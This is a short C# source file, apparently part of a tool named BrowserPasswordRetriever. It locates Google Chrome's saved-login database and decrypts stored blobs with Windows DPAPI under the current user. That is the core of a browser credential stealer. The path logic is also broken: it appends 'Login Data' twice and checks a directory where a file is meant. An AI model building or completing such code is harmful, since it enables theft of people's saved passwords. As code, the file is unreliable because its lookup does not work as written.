using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BrowserPasswordRetriever
{
	using System.IO;
	using System.Security.Cryptography;

	class Chrome
	{
		public static string Decrypt( byte[] blob )
		{
			byte[] decryptedBytes = ProtectedData.Unprotect(blob, null, DataProtectionScope.CurrentUser);
			return Encoding.UTF8.GetString(decryptedBytes);
		}

		public static string GetPasswordsFile()
		{
			string localApplicationPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string chromePath = Path.Combine(localApplicationPath, "Google", "Chrome", "User Data", "Default", "Login Data");
			string fileName = Path.Combine(chromePath, "Login Data");
			if (!Directory.Exists(chromePath))
			{
				throw new Exception("Google Chrome user data files cannot be found.");
			}
			return fileName;
		}

	}
}
